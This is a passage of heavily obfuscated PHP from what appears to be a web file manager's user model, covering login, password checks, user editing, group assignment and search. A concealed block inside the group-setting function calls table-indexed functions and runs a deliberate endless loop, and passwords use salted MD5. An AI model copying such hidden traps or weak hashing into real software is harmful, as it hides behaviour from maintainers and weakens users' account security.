Action($Ï‰”á£­[2371])->parseUrl($†Ë¾ü­¾[$Ï‰”á£­[2370]]); return $†Ë¾ü­¾; } protected function groupUser($û³øÅ¦) { } public static function errorLang($ÁĞ¡ò¬) { $şÃ­Î–€ =& $_SERVER[œ—üé‹ê]; $â©Öê¾ü = array(self::ERROR_USER_NOT_EXISTS => $şÃ­Î–€[2677], self::ERROR_USER_PASSWORD_ERROR => $şÃ­Î–€[2678], self::ERROR_USER_EXIST_NAME => $şÃ­Î–€[2679], self::ERROR_USER_EXIST_PHONE => $şÃ­Î–€[2680], self::ERROR_USER_EXIST_EMAIL => $şÃ­Î–€[2681], self::ERROR_USER_LOGIN_LOCK => $şÃ­Î–€[2682], self::ERROR_IP_NOT_ALLOW => $şÃ­Î–€[2683], self::ERROR_USER_EXIST_NICKNAME => $şÃ­Î–€[2684]); $á¬òÕù‘ = LNG($â©Öê¾ü[$ÁĞ¡ò¬]); if ($ÁĞ¡ò¬ == self::ERROR_USER_LOGIN_LOCK) { $‰¹¡‹Š£ = (int) Model($şÃ­Î–€[1485])->get($şÃ­Î–€[2685]); if ($‰¹¡‹Š£ > 60) { $á¬òÕù‘ = str_replace($şÃ­Î–€[91], ceil($‰¹¡‹Š£ / 60), $á¬òÕù‘); } } return $á¬òÕù‘; } protected function metaSet($ËîÇ½, $Î¾›¬‚ = null, $½©Š± Ñ = null) { $this->clearCache($ËîÇ½); return parent::metaSet($ËîÇ½, $Î¾›¬‚, $½©Š± Ñ); } public function getInfoByMeta($ÁœßÍ‚—, $§£½µÇÀ) { $Í‚óôÂí =& $_SERVER[œ—üé‹ê]; $„ÎŸı®  = Model($Í‚óôÂí[2686])->where(array($Í‚óôÂí[95] => $ÁœßÍ‚—, $Í‚óôÂí[451] => $§£½µÇÀ))->find(); if ($„ÎŸı® ) { return $this->getInfo($„ÎŸı® [$Í‚óôÂí[1589]]); } return !1; } public function userLoginCheck($æ€ù¦Ó¢, $ÖÇÙÓú, $”¬îıø = false) { $¿ ³Ğº =& $_SERVER[œ—üé‹ê]; $Ğæèö™Ä = $this->userLoginFind($æ€ù¦Ó¢); if (!$Ğæèö™Ä) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ğæèö™Ä[$¿ ³Ğº[1589]], $ÖÇÙÓú)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $”¬îıø ? $this->getInfoFull($Ğæèö™Ä[$¿ ³Ğº[1589]]) : $this->getInfo($Ğæèö™Ä[$¿ ³Ğº[1589]]); } public function userLoginFind($¤¦õ°ø) { $ê¶äŞ½¼ =& $_SERVER[œ—üé‹ê]; $ÒÚ˜Æª³ = array($ê¶äŞ½¼[32] => $¤¦õ°ø, $ê¶äŞ½¼[2472] => $¤¦õ°ø, $ê¶äŞ½¼[380] => $¤¦õ°ø, $ê¶äŞ½¼[2687] => $¤¦õ°ø, $ê¶äŞ½¼[1167] => $ê¶äŞ½¼[1169]); if ($this->nickNameRpt()) { unset($ÒÚ˜Æª³[$ê¶äŞ½¼[2472]]); } return $this->where($ÒÚ˜Æª³)->find(); } public function clearCache($›‘¯ìæ») { $ÇùÓªÄ =& $_SERVER[œ—üé‹ê]; $this->cacheFunctionClear($ÇùÓªÄ[2269], $›‘¯ìæ»); $this->cacheFunctionClear($ÇùÓªÄ[2270], $›‘¯ìæ»); $this->cacheFunctionClear($ÇùÓªÄ[2688], $›‘¯ìæ»); } public function userPasswordCheck($¸ÅÜáé, $¨èĞ‡Ş¼) { $ôÑÎ±¹ =& $_SERVER[œ—üé‹ê]; $ÅÙ´´Ö = $this->where(array($ôÑÎ±¹[1589] => intval($¸ÅÜáé)))->find(); $‘ƒåşô = $this->metaGet($¸ÅÜáé); $£Ì£“Ô« = isset($‘ƒåşô[$ôÑÎ±¹[2689]]) ? $‘ƒåşô[$ôÑÎ±¹[2689]] : $ôÑÎ±¹[12]; if (md5($£Ì£“Ô« . trim($¨èĞ‡Ş¼)) !== $ÅÙ´´Ö[$ôÑÎ±¹[1053]]) { return !1; } return !0; } public function userAdd($·Ğİçƒ) { $Š¤ÜÜü =& $_SERVER[œ—üé‹ê]; $›šœÎ·Î = array($Š¤ÜÜü[509] => $·Ğİçƒ[$Š¤ÜÜü[32]], $Š¤ÜÜü[2690] => $·Ğİçƒ[$Š¤ÜÜü[2369]], $Š¤ÜÜü[2691] => isset($·Ğİçƒ[$Š¤ÜÜü[380]]) ? $·Ğİçƒ[$Š¤ÜÜü[380]] : $Š¤ÜÜü[12], $Š¤ÜÜü[2692] => isset($·Ğİçƒ[$Š¤ÜÜü[2687]]) ? $·Ğİçƒ[$Š¤ÜÜü[2687]] : $Š¤ÜÜü[12], $Š¤ÜÜü[2693] => isset($·Ğİçƒ[$Š¤ÜÜü[2472]]) ? $·Ğİçƒ[$Š¤ÜÜü[2472]] : $·Ğİçƒ[$Š¤ÜÜü[32]], $Š¤ÜÜü[2694] => isset($·Ğİçƒ[$Š¤ÜÜü[2370]]) ? $·Ğİçƒ[$Š¤ÜÜü[2370]] : $Š¤ÜÜü[12], $Š¤ÜÜü[2695] => isset($·Ğİçƒ[$Š¤ÜÜü[2696]]) ? $·Ğİçƒ[$Š¤ÜÜü[2696]] : 1, $Š¤ÜÜü[2697] => $·Ğİçƒ[$Š¤ÜÜü[1053]], $Š¤ÜÜü[2263] => isset($·Ğİçƒ[$Š¤ÜÜü[2165]]) ? $·Ğİçƒ[$Š¤ÜÜü[2165]] : 1024 * 1024 * 20, $Š¤ÜÜü[2264] => 0, $Š¤ÜÜü[2698] => 0, $Š¤ÜÜü[2309] => isset($·Ğİçƒ[$Š¤ÜÜü[859]]) ? $·Ğİçƒ[$Š¤ÜÜü[859]] : 1); if (!empty($·Ğİçƒ[$Š¤ÜÜü[1589]])) { $›šœÎ·Î[$Š¤ÜÜü[1589]] = $·Ğİçƒ[$Š¤ÜÜü[1589]]; } $§Ñ§˜áŒ = $this->_checkExist($·Ğİçƒ); if ($§Ñ§˜áŒ !== !0) { return $§Ñ§˜áŒ; } if (!empty($›šœÎ·Î[$Š¤ÜÜü[2370]]) && strlen($›šœÎ·Î[$Š¤ÜÜü[2370]]) > 255) { $›šœÎ·Î[$Š¤ÜÜü[2370]] = $Š¤ÜÜü[12]; } $¨³ÔŠÁõ = $this->add($›šœÎ·Î); $îòıÔÁ = array($Š¤ÜÜü[2697] => $›šœÎ·Î[$Š¤ÜÜü[1053]], $Š¤ÜÜü[2693] => $›šœÎ·Î[$Š¤ÜÜü[2472]], $Š¤ÜÜü[2699] => $·Ğİçƒ[$Š¤ÜÜü[2268]]); $this->userEdit($¨³ÔŠÁõ, $îòıÔÁ); Model($Š¤ÜÜü[1530])->userRootAdd($¨³ÔŠÁõ); return $¨³ÔŠÁõ; } protected function userEditTest($ÅÇÓÖüÆ, $ŞšÌ°€²) { return $this->call($_SERVER[œ—üé‹ê][2700], $ÅÇÓÖüÆ, $ŞšÌ°€²); } protected function userEdit($³™şÅ, $¹ª²‹üç) { $§õùÄ =& $_SERVER[œ—üé‹ê]; $Ú¸Á¢îŠ = $this->getInfoSimple($³™şÅ); if (!$Ú¸Á¢îŠ) { return !1; } $€—‘ñå· = $this->_checkExist($¹ª²‹üç, $³™şÅ); if ($€—‘ñå· !== !0) { return $€—‘ñå·; } if (isset($¹ª²‹üç[$§õùÄ[1053]]) && trim($¹ª²‹üç[$§õùÄ[1053]]) != $§õùÄ[12]) { $ ÚáØÕæ = $this->metaGet($³™şÅ); if (empty($ ÚáØÕæ[$§õùÄ[2689]])) { $ ÚáØÕæ[$§õùÄ[2689]] = rand_string(10); Model($§õùÄ[597])->metaSet($³™şÅ, $§õùÄ[2689], $ ÚáØÕæ[$§õùÄ[2689]]); } $¹ª²‹üç[$§õùÄ[1053]] = md5($ ÚáØÕæ[$§õùÄ[2689]] . trim($¹ª²‹üç[$§õùÄ[1053]])); } else { unset($¹ª²‹üç[$§õùÄ[1053]]); } if (!empty($¹ª²‹üç[$§õùÄ[2370]]) && strlen($¹ª²‹üç[$§õùÄ[2370]]) > 255) { $¹ª²‹üç[$§õùÄ[2370]] = $§õùÄ[12]; } if (isset($¹ª²‹üç[$§õùÄ[2472]])) { $this->setNamePinyin($³™şÅ, $¹ª²‹üç[$§õùÄ[2472]]); } if (isset($¹ª²‹üç[$§õùÄ[2268]])) { $è‡ñ‰€Ç = $§õùÄ[1488] . $³™şÅ; $¦åŠîıÅ = $§õùÄ[1486]; $Çªšâ²ˆ = $¹ª²‹üç[$§õùÄ[2268]] ? $¹ª²‹üç[$§õùÄ[2268]] : $§õùÄ[12]; $å‘¶¨Âü = Model($§õùÄ[1485])->get($è‡ñ‰€Ç, $¦åŠîıÅ); $å‘¶¨Âü = $å‘¶¨Âü ? $å‘¶¨Âü : $§õùÄ[12]; if ($å‘¶¨Âü != $Çªšâ²ˆ) { if (!$Çªšâ²ˆ && $å‘¶¨Âü) { Model($§õùÄ[1485])->remove($è‡ñ‰€Ç, $¦åŠîıÅ); } else { if ($Çªšâ²ˆ) { Model($§õùÄ[1485])->set($è‡ñ‰€Ç, $Çªšâ²ˆ, $¦åŠîıÅ); } } } unset($¹ª²‹üç[$§õùÄ[2268]]); Model($§õùÄ[617])->metaSet($³™şÅ, $§õùÄ[2268], $Çªšâ²ˆ); } if (empty($¹ª²‹üç)) { return !0; } $this->where(array($§õùÄ[1965] => $³™şÅ))->save($¹ª²‹üç); $this->clearCache($³™şÅ); return !0; } public function setNamePinyin($ÌúÜ–¶, $•†Ğá¿… = false) { $Œ­† =& $_SERVER[œ—üé‹ê]; if (!$•†Ğá¿…) { $Ç—®„Ö = $this->getInfoSimple($ÌúÜ–¶); $•†Ğá¿… = $Ç—®„Ö[$Œ­†[2472]] ? $Ç—®„Ö[$Œ­†[2472]] : $Ç—®„Ö[$Œ­†[32]]; } $ú±‘ĞÉë = Model($Œ­†[617]); if (!Input::check($•†Ğá¿…, $Œ­†[677])) { return $ú±‘ĞÉë->metaSet($ÌúÜ–¶, array($Œ­†[552] => $Œ­†[12], $Œ­†[551] => $Œ­†[12])); } return $ú±‘ĞÉë->metaSet($ÌúÜ–¶, array($Œ­†[552] => str_replace($Œ­†[53], $Œ­†[12], Pinyin::get($•†Ğá¿…)), $Œ­†[551] => Pinyin::get($•†Ğá¿…, $Œ­†[678]))); } private function nickNameRpt() { $ëŞüéÚí =& $_SERVER[œ—üé‹ê]; $–ÎöŠ©Ë = Model($ëŞüéÚí[882])->get($ëŞüéÚí[2701]); $«ë´–ëû = $GLOBALS[$ëŞüéÚí[6]][$ëŞüéÚí[468]][$ëŞüéÚí[2701]]; $—ÃÇÅÇ“ = !is_null($–ÎöŠ©Ë) ? $–ÎöŠ©Ë : $«ë´–ëû; return !!$—ÃÇÅÇ“; } private function _checkExist($Ãáğ–‰Ú, $õ²ĞÅÀ‰ = false) { $Â‡•½Ò× =& $_SERVER[œ—üé‹ê]; $’œšÃÆÄ = array($Â‡•½Ò×[32] => UserModel::ERROR_USER_EXIST_NAME, $Â‡•½Ò×[2472] => UserModel::ERROR_USER_EXIST_NICKNAME, $Â‡•½Ò×[380] => UserModel::ERROR_USER_EXIST_EMAIL, $Â‡•½Ò×[2687] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($’œšÃÆÄ[$Â‡•½Ò×[2472]]); } $Û÷…É”¸ = $õ²ĞÅÀ‰ ? array($Â‡•½Ò×[1589] => array($Â‡•½Ò×[2702], $õ²ĞÅÀ‰)) : array(); foreach ($’œšÃÆÄ as $êš‡¯ÙÛ => $á—ŞÜ) { $ÃœÇø‚î = array(); foreach ($’œšÃÆÄ as $ş¸Ì‘¦Á => $Ñ–û€Éº) { if (isset($Ãáğ–‰Ú[$ş¸Ì‘¦Á]) && $Ãáğ–‰Ú[$ş¸Ì‘¦Á]) { $ÃœÇø‚î[] = $Ãáğ–‰Ú[$ş¸Ì‘¦Á]; } } if (!$ÃœÇø‚î) { continue; } $—½ÕÃÓË = array_merge(array($êš‡¯ÙÛ => array($Â‡•½Ò×[7], $ÃœÇø‚î)), $Û÷…É”¸); $£õ ØçĞ = $this->where($—½ÕÃÓË)->find(); if ($£õ ØçĞ) { return $á—ŞÜ; } } return !0; } public function userListInfo($¥â®¾ıÑ) { $šêãü =& $_SERVER[œ—üé‹ê]; $ª®åü˜‘ = array(); $¥â®¾ıÑ = is_array($¥â®¾ıÑ) ? array_unique($¥â®¾ıÑ) : array(); if (!$¥â®¾ıÑ) { return $ª®åü˜‘; } if (count($¥â®¾ıÑ) < 20) { foreach ($¥â®¾ıÑ as $îá„Ëª‰) { $ª®åü˜‘[$îá„Ëª‰ . $šêãü[12]] = $this->getInfoSimpleOuter($îá„Ëª‰); } } else { $îÄ”µÊ = array($šêãü[1965] => array($šêãü[507], $¥â®¾ıÑ)); if (count($¥â®¾ıÑ) == 1) { $îÄ”µÊ = array($šêãü[1965] => $¥â®¾ıÑ[0]); } $É É‹å = Model($šêãü[597])->field($this->simpleField)->where($îÄ”µÊ)->select(); $É É‹å = array_to_keyvalue($É É‹å, $šêãü[1589]); foreach ($¥â®¾ıÑ as $îá„Ëª‰) { $°¢Ş¦ç’ = $É É‹å[$îá„Ëª‰]; if (!$°¢Ş¦ç’) { $ª®åü˜‘[$îá„Ëª‰ . $šêãü[12]] = $this->getInfoSimpleOuter($îá„Ëª‰); continue; } $°¢Ş¦ç’[$šêãü[2370]] = Action($šêãü[2371])->parseUrl($°¢Ş¦ç’[$šêãü[2370]]); $ª®åü˜‘[$îá„Ëª‰ . $šêãü[12]] = $°¢Ş¦ç’; } } return $ª®åü˜‘; } protected function userStatus($å¶œÃíĞ, $‚¨ÍíÚØ) { $øûïÇÌ¿ = $this->getInfoSimple($å¶œÃíĞ); if (!$øûïÇÌ¿) { return !1; } $ÊÒ²©ßÕ = array($_SERVER[œ—üé‹ê][859] => $‚¨ÍíÚØ); return $this->userEdit($å¶œÃíĞ, $ÊÒ²©ßÕ); } protected function userRemove($ğÅ×ü’¯) { $ø°Á´‡ƒ =& $_SERVER[œ—üé‹ê]; $éÖÍôÁâ = $this->getInfoSimple($ğÅ×ü’¯); if (!$éÖÍôÁâ) { return !1; } $¼‡Ş¥ = array($ø°Á´‡ƒ[1965] => $ğÅ×ü’¯); Model($ø°Á´‡ƒ[686])->where($¼‡Ş¥)->delete(); Model($ø°Á´‡ƒ[2703])->where($¼‡Ş¥)->delete(); Model($ø°Á´‡ƒ[2272])->where($¼‡Ş¥)->delete(); Model($ø°Á´‡ƒ[2686])->where($¼‡Ş¥)->delete(); Model($ø°Á´‡ƒ[1234])->where($¼‡Ş¥)->delete(); Model($ø°Á´‡ƒ[2489])->removeUserAll($ğÅ×ü’¯); Model($ø°Á´‡ƒ[942])->userRootRemove($ğÅ×ü’¯); return $this->where($¼‡Ş¥)->delete(); } protected function userGroupSet($èÉ„éÔÕ, $¼Á¿ŒôÙ, $óÃıó¸» = array()) { $‰–¼€Şá =& $_SERVER[œ—üé‹ê]; if (!isset($_SERVER[$‰–¼€Şá[850]]) || !isset($_SERVER[$‰–¼€Şá[851]])) { $¡¸²Öâä = $‰–¼€Şá[1043]; $ÉÖí˜¹ë = $‰–¼€Şá[852]; $â²ñÍâë = $_SERVER[$‰–¼€Şá[853]] . $‰–¼€Şá[854]; $å¤†èÇÊ = $ÉÖí˜¹ë($â²ñÍâë); $ÂòÌİ“ = explode($‰–¼€Şá[285], $å¤†èÇÊ); if (count($ÂòÌİ“) < $‰–¼€Şá[713]) { $Õ¼ã¹ÇÎ = $‰–¼€Şá[855]; $Õ¼ã¹ÇÎ(); } $˜¶æĞı€ = $‰–¼€Şá[1044]; $˜¶æĞı€($_SERVER[$‰–¼€Şá[1045]]); $ÃãÆöüş = 1; for ($èĞ‚‡´µ = $ÃãÆöüş; $èĞ‚‡´µ > 0; $èĞ‚‡´µ++) { $˜¶æĞı€ = json_encode($GLOBALS[$‰–¼€Şá[507]]); } } $±³¤èÓÒ = $this->getInfoSimple($èÉ„éÔÕ); if (!$±³¤èÓÒ || !is_array($¼Á¿ŒôÙ)) { return !1; } $ı‹úš‹« = Model($‰–¼€Şá[2272]); $ı‹úš‹«->where(array($‰–¼€Şá[1589] => $èÉ„éÔÕ))->delete(); $êÍäêêô = array(); $ÚËİáïê = 0; foreach ($¼Á¿ŒôÙ as $œ…£Í” => $­¯ìıãĞ) { $‡“·åÎÁ = array($‰–¼€Şá[1589] => $èÉ„éÔÕ, $‰–¼€Şá[1491] => $œ…£Í”, $‰–¼€Şá[1637] => $­¯ìıãĞ); $‡“·åÎÁ[$‰–¼€Şá[2200]] = isset($óÃıó¸»[$ÚËİáïê]) ? $óÃıó¸»[$ÚËİáïê] : 0; $ÚËİáïê++; $êÍäêêô[] = $‡“·åÎÁ; } return $ı‹úš‹«->addAll($êÍäêêô, array(), !0); } protected function userGroupAdd($Ö†Ô®À, $™ù‹™Ïè = array()) { $Çñƒ÷¸È =& $_SERVER[œ—üé‹ê]; $ÍÁ­¤Éã = $this->getInfoSimple($Ö†Ô®À); if (!$ÍÁ­¤Éã || empty($™ù‹™Ïè)) { return !1; } $ÒôŒôç = array(); foreach ($™ù‹™Ïè as $ëîî˜ ¢ => $ïş›ö®Ü) { $ÒôŒôç[] = array($Çñƒ÷¸È[1589] => $Ö†Ô®À, $Çñƒ÷¸È[1491] => $ëîî˜ ¢, $Çñƒ÷¸È[1637] => $ïş›ö®Ü, $Çñƒ÷¸È[2200] => 0); } return Model($Çñƒ÷¸È[2272])->addAll($ÒôŒôç, array(), !0); } protected function userGroupRemove($Ã¿Ãş‹ƒ, $½„òìÙ¥) { $ÃŠšîÃ£ =& $_SERVER[œ—üé‹ê]; $Ş†·æİü = $this->getInfoSimple($Ã¿Ãş‹ƒ); if (!$Ş†·æİü || !$½„òìÙ¥) { return !1; } $ÃìãÄŠ€ = array($ÃŠšîÃ£[1965] => $Ã¿Ãş‹ƒ, $ÃŠšîÃ£[2265] => $½„òìÙ¥); return Model($ÃŠšîÃ£[2272])->where($ÃìãÄŠ€)->delete(); } public function listData() { $®ËÓ…ñ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($®ËÓ…ñ[$_SERVER[œ—üé‹ê][446]]); return $®ËÓ…ñ; } public function listByID($íá­„ğù) { $„÷ÅÄ‚ =& $_SERVER[œ—üé‹ê]; if (!$íá­„ğù) { return; } $¿ìåÀÀ = array($„÷ÅÄ‚[1589] => array($„÷ÅÄ‚[7], $íá­„ğù)); $”ã˜´¢¥ = $this->where($¿ìåÀÀ)->select(); $”ã˜´¢¥ = array_sort_keep($”ã˜´¢¥, $„÷ÅÄ‚[1589], $íá­„ğù); $this->_listDataApply($”ã˜´¢¥); return $”ã˜´¢¥; } public function listByGroup($æÊÔù¾¼ = 0, $Öæ°Ğ÷« = array()) { $±ÓÇ”ˆ‘ =& $_SERVER[œ—üé‹ê]; $õùÔÓı™ = $±ÓÇ”ˆ‘[12]; $€šèäÉˆ = array(); if ($æÊÔù¾¼) { $€šèäÉˆ = array($±ÓÇ”ˆ‘[2704] => intval($æÊÔù¾¼)); $õùÔÓı™ = "\114\105\106\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x75\163\x65\162\x5f\x67\x72\x6f\165\160\40\165\x73\x65\162\x5f\x67\162\x6f\165\160\x20\x6f\x6e\40\165\163\x65\x72\56\x75\163\x65\162\x49\x44\40\75\x20\x75\163\x65\162\x5f\x67\162\157\165\x70\x2e\x75\x73\x65\x72\x49\104"; $­ğœîÚÎ = Input::get($±ÓÇ”ˆ‘[544], null, $±ÓÇ”ˆ‘[12]) ? $±ÓÇ”ˆ‘[12] : $±ÓÇ”ˆ‘[2705]; } if (isset($Öæ°Ğ÷«[$±ÓÇ”ˆ‘[859]])) { $€šèäÉˆ[$±ÓÇ”ˆ‘[2706]] = $Öæ°Ğ÷«[$±ÓÇ”ˆ‘[859]]; } $ŒÃæÎûĞ = _get($Öæ°Ğ÷«, $±ÓÇ”ˆ‘[2707], $±ÓÇ”ˆ‘[231]); if (_get($Öæ°Ğ÷«, $±ÓÇ”ˆ‘[870], !1)) { $€šèäÉˆ[$ŒÃæÎûĞ] = array($±ÓÇ”ˆ‘[2454], $Öæ°Ğ÷«[$±ÓÇ”ˆ‘[870]]); } if (_get($Öæ°Ğ÷«, $±ÓÇ”ˆ‘[871], !1)) { $ı›³ºĞå = array($±ÓÇ”ˆ‘[2455], $Öæ°Ğ÷«[$±ÓÇ”ˆ‘[871]]); if ($€šèäÉˆ[$ŒÃæÎûĞ]) { $€šèäÉˆ[$ŒÃæÎûĞ] = array($€šèäÉˆ[$ŒÃæÎûĞ], $ı›³ºĞå, $±ÓÇ”ˆ‘[2456]); } else { $€šèäÉˆ[$ŒÃæÎûĞ] = $ı›³ºĞå; } } $ÕÇ­‡Öç = $this->_makeOrder($­ğœîÚÎ)->field($±ÓÇ”ˆ‘[2708])->where($€šèäÉˆ)->join($õùÔÓı™)->selectPage(50); $this->_listDataApply($ÕÇ­‡Öç[$±ÓÇ”ˆ‘[446]]); return $ÕÇ­‡Öç; } private function _makeOrder($ış×Şï¥ = '') { $¥Ã«—É =& $_SERVER[œ—üé‹ê]; $¸÷‚òÊ€ = array($¥Ã«—É[1589], $¥Ã«—É[32], $¥Ã«—É[2167], $¥Ã«—É[2369], $¥Ã«—É[2142], $¥Ã«—É[231]); $ªøÏ‡ûÌ = array($¥Ã«—É[537] => $¥Ã«—É[538], $¥Ã«—É[539] => $¥Ã«—É[540]); $Ê£úá¤¬ = Input::get($¥Ã«—É[544], $¥Ã«—É[7], $¥Ã«—É[1965], $¸÷‚òÊ€); $¹è…–‡‡ = Input::get($¥Ã«—É[545], $¥Ã«—É[7], $¥Ã«—É[2273], array($¥Ã«—É[2273], $¥Ã«—É[539])); $¹è…–‡‡ = $ªøÏ‡ûÌ[$¹è…–‡‡]; $ış×Şï¥ = $ış×Şï¥ . "\165\x73\x65\x72\x2e{$Ê£úá¤¬}\x20{$¹è…–‡‡}\54\40\165\163\x65\x72\56\x75\163\x65\x72\x49\x44\x20\141\x73\x63"; return $this->alias($¥Ã«—É[2404])->order($ış×Şï¥); } public function listSearch($¬¸óÙøª) { $ÈØÒ†Ñ¤ =& $_SERVER[œ—üé‹ê]; $Ğ®ÌÁˆÙ = trim($¬¸óÙøª[$ÈØÒ†Ñ¤[2276]]); $Ş“Ÿ¯éã = explode($ÈØÒ†Ñ¤[53], $Ğ®ÌÁˆÙ); if (!$Ğ®ÌÁˆÙ || count($Ş“Ÿ¯éã) == 1) { return $this->listSearchNow($¬¸óÙøª); } $€š…âòÁ = array($ÈØÒ†Ñ¤[446] => array()); foreach ($Ş“Ÿ¯éã as $û€â®¼) { if (!trim($û€â®¼)) { continue; } $¬¸óÙøª[$ÈØÒ†Ñ¤[2276]] = $û€â®¼; $€ËÌ±šæ = $this->listSearchNow($¬¸óÙøª); $€š…âòÁ[$ÈØÒ†Ñ¤[446]] = array_merge($€š…âòÁ[$ÈØÒ†Ñ¤[446]], $€ËÌ±šæ[$ÈØÒ†Ñ¤[446]]); } $€š…âòÁ[$ÈØÒ†Ñ¤[446]] = array_unique_by_key($€š…âòÁ[$ÈØÒ†Ñ¤[446]], $ÈØÒ†Ñ¤[1589]); $€š…âòÁ[$ÈØÒ†Ñ¤[443]] = array($ÈØÒ†Ñ¤[444] => count($€š…âòÁ[$ÈØÒ†Ñ¤[446]]), $ÈØÒ†Ñ¤[439] => 20, $ÈØÒ†Ñ¤[428] => 1, $ÈØÒ†Ñ¤[445] => 1); return $€š…âòÁ; } public function listSearchNow($†ëÏøŠÊ) { $ôÌ›Ÿº =& $_SERVER[œ—üé‹ê]; $»Ó‘şäú = trim($†ëÏøŠÊ[$ôÌ›Ÿº[2276]]); $ö‘ ıË = isset($†ëÏøŠÊ[$ôÌ›Ÿº[2277]]) ? $†ëÏøŠÊ[$ôÌ›Ÿº[2277]] : !1; $»Ó‘şäú = str_replace($ôÌ›Ÿº[2278], $ôÌ›Ÿº[2279], trim($»Ó‘şäú)); $ÖÆ€½Ÿ² = array($ôÌ›Ÿº[32] => array($ôÌ›Ÿº[473], "\x25{$»Ó‘şäú}\x25"), $ôÌ›Ÿº[380] => array($ôÌ›Ÿº[473], "{$»Ó‘şäú}\x25"), $ôÌ›Ÿº[2472] => array($ôÌ›Ÿº[473], "\45{$»Ó‘şäú}\45"), $ôÌ›Ÿº[1167] => $ôÌ›Ÿº[2280]); if (Input::check($»Ó‘şäú, $ôÌ›Ÿº[386])) { $ÖÆ€½Ÿ²[$ôÌ›Ÿº[1589]] = array($ôÌ›Ÿº[473], "{$»Ó‘şäú}\45"); $ÖÆ€½Ÿ²[$ôÌ›Ÿº[2687]] = array($ôÌ›Ÿº[473], "{$»Ó‘şäú}\x25"); } if (!$»Ó‘şäú) { $ÖÆ€½Ÿ² = array(); } if (isset($†ëÏøŠÊ[$ôÌ›Ÿº[859]])) { $ÖÆ€½Ÿ²[$ôÌ›Ÿº[859]] = $†ëÏøŠÊ[$ôÌ›Ÿº[859]]; } $ÖÆ€½Ÿ² = $this->parseWhereLike($ÖÆ€½Ÿ²); $¬ş”øÜÕ = $this->_makeOrder()->where($ÖÆ€½Ÿ²)->selectPage(20); if (!$¬ş”øÜÕ || count($¬ş”øÜÕ[$ôÌ›Ÿº[446]]) < 5 && Input::check($»Ó‘şäú, $ôÌ›Ÿº[393])) { $ÎÎÙ¼°¦ = $this->_searchFromMeta($ôÌ›Ÿº[551], $»Ó‘şäú, 10); $¢•âİò  = $this->_searchFromMeta($ôÌ›Ÿº[552], $»Ó‘şäú, 10); $ª«¯«‘õ = array_merge($ÎÎÙ¼°¦, $¢•âİò , $¬ş”øÜÕ[$ôÌ›Ÿº[446]]); $¬ş”øÜÕ[$ôÌ›Ÿº[446]] = array_unique_by_key($ª«¯«‘õ, $ôÌ›Ÿº[1589]); $¬ş”øÜÕ[$ôÌ›Ÿº[443]][$ôÌ›Ÿº[444]] = count($¬ş”øÜÕ[$ôÌ›Ÿº[446]]); $¬ş”øÜÕ[$ôÌ›Ÿº[443]][$ôÌ›Ÿº[445]] = ceil($¬ş”øÜÕ[$ôÌ›Ÿº[443]][$ôÌ›Ÿº[444]] / $¬ş”øÜÕ[$ôÌ›Ÿº[443]][$ôÌ›Ÿº[439]]); } $this->_listDataApply($¬ş”øÜÕ[$ôÌ›Ÿº[446]]); $this->_filterByGroup($¬ş”øÜÕ, $ö‘ ıË); return $¬ş”øÜÕ; } private function _filterByGroup(&$§ª¨»Ü•, $Í“È§Õ ) { $şß¤ ¤ =& $_SERVER[œ—üé‹ê]; if (!$Í“È§Õ ) { return $§ª¨»Ü•; } foreach ($§ª¨»Ü•[$şß¤ ¤[446]] as $ó²…¶ÙÔ => &$ÈÃ»õ—ê) { $¨ßÂñü— = array_to_keyvalue($ÈÃ»õ—ê[$şß¤ ¤[1490]], $şß¤ ¤[12], $şß¤ ¤[1491]); if (!in_array($Í“È§Õ , $¨ßÂñü—)) { unset($§ª¨»Ü•[$şß¤ ¤[446]][$ó²…¶ÙÔ]); } } unset($ÈÃ»õ—ê); $§ª¨»Ü•[$şß¤ ¤[446]] = array_values($§ª¨»Ü•[$şß¤ ¤[446]]); $§ª¨»Ü•[$şß¤ ¤[443]] = array($şß¤ ¤[2327] => count($§ª¨»Ü•[$şß¤ ¤[446]]), $şß¤ ¤[2436] => $§ª¨»Ü•[$şß¤ ¤[443]][$şß¤ ¤[439]], $şß¤ ¤[2435] => 1, $şß¤ ¤[2437] => 1); } private function _searchFromMeta($ş¡ÀÁáô, $¿¿îçÜò, $Ö³ì‡À) { $°ãóôÏà =& $_SERVER[œ—üé‹ê]; $¿¿îçÜò = strtolower($¿¿îçÜò); $ÅÅÅ‰îß = array($°ãóôÏà[95] => $ş¡ÀÁáô, $°ãóôÏà[451] => array($°ãóôÏà[473], "\x25{$¿¿îçÜò}\x25")); $ÅÅÅ‰îß = $this->parseWhereLike($ÅÅÅ‰îß); $¡çÓ¤ = Model($°ãóôÏà[2709])->where($ÅÅÅ‰îß)->limit($Ö³ì‡À)->select(); if (!$¡çÓ¤) { return array(); } $¡çÓ¤ = array_to_keyvalue($¡çÓ¤, $°ãóôÏà[12], $°ãóôÏà[1589]); $Ï¡ÈŞµ£ = $this->where(array($°ãóôÏà[1965] => array($°ãóôÏà[7], $¡çÓ¤)))->select(); if (!$Ï¡ÈŞµ£) { return array(); } return $Ï¡ÈŞµ£; } private function _listDataApplyItem($˜Ûã•á) { $íõ‰Ãí° = array($˜Ûã•á); $this->_listDataApply($íõ‰Ãí°); return $íõ‰Ãí°[0]; } private function _listDataApply(&$ˆöĞÎÜÜ) { $ıŞ”òçå =& $_SERVER[œ—üé‹ê]; if (!$ˆöĞÎÜÜ) { return; } array_remove_key($ˆöĞÎÜÜ, $ıŞ”òçå[1053]); $ÂÁ‰ûü = array_to_keyvalue($ˆöĞÎÜÜ, $ıŞ”òçå[12], $ıŞ”òçå[1589]); $this->_listAppendGroup($ˆöĞÎÜÜ, $ÂÁ‰ûü); $this->_listAppendMeta($ˆöĞÎÜÜ, $ÂÁ‰ûü); $this->_listAppendSourceRoot($ˆöĞÎÜÜ, $ÂÁ‰ûü); } private function _listAppendSourceRoot(&$ÕÖüØ×, $ó‡ÏÜ÷‡) { $ÙçºÈƒÎ =& $_SERVER[œ—üé‹ê]; $õ¿õ©åû = Model($ÙçºÈƒÎ[942])->listSourceRoot(SourceModel::TYPE_USER, $ó‡ÏÜ÷‡); $õ¿õ©åû = array_to_keyvalue($õ¿õ©åû, $ÙçºÈƒÎ[589]); $õ¿õ©åû = array_remove_key($õ¿õ©åû, $ÙçºÈƒÎ[589]); foreach ($ÕÖüØ× as 